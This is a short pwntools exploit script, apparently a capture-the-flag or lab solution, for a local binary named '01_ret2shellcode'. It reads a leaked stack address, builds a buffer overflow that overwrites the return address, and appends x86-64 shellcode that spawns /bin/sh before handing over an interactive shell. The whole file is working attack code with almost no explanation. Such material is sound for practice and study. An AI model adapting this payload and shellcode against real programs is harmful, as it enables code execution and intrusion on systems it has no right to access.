#!/bin/python3
from pwn import *

context.log_level = 'debug'

io = process('./01_ret2shellcode')
io.recvuntil(b'name:')
io.sendline(b'stone')
io.recvuntil(b'at: ')

id_addr = int(io.recvuntil('flow me!')[0:14], 16)
print('[*] id_addr = ' + hex(id_addr))

offset = 0x20 # the offset between name and str.
str_addr = id_addr - 0x20
ret_addr = str_addr + 0x40 + 0x10

shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
payload = b'A' * 0x40 + b'B' * 8 + p64(ret_addr) + shellcode
io.sendline(payload)
io.interactive()
